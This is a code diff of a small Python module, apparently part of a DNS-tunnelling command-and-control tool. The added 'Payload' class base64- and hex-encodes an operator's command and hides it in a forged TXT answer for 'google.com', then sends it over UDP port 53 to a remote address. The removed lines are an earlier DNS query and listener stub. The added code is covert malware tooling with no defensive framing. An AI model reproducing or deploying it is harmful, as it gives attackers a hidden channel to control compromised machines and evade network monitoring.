@@ -1,19 +1,17 @@
-import socket
-import dns.name
-import dns.message
-import dns.query
+import base64
+from dnslib import DNSRecord, DNSHeader, RR
 
 class Payload:
-    def __init__(self):
-        pass
+    def __init__(self,addr):
+        self.addr = addr
 
-def payload(addr):
-    query = dns.message.make_query("google.com", dns.rdatatype.A)
-    result = dns.query.udp(query, addr, 5,ignore_trailing=True,ignore_unexpected=True)
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(("127.0.0.1", 53))
-    while 1:
-        data, addr = sock.recvfrom(1024)
-        print("received message: %s" % data)
-
-payload("10.145.228.172")
+    def payload(self,sock,req,com):
+        command = com
+        command_bytes = command.encode('ascii')
+        base_64_bytes = base64.b64encode(command_bytes)
+        finalCommand = bytes.hex(base_64_bytes)
+        request = DNSRecord.parse(req)
+        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+        reply.add_answer(*RR.fromZone("google.com TXT " + "/" + finalCommand + "/"))
+        resp = reply.pack()
+        sock.sendto(resp,(self.addr,53))
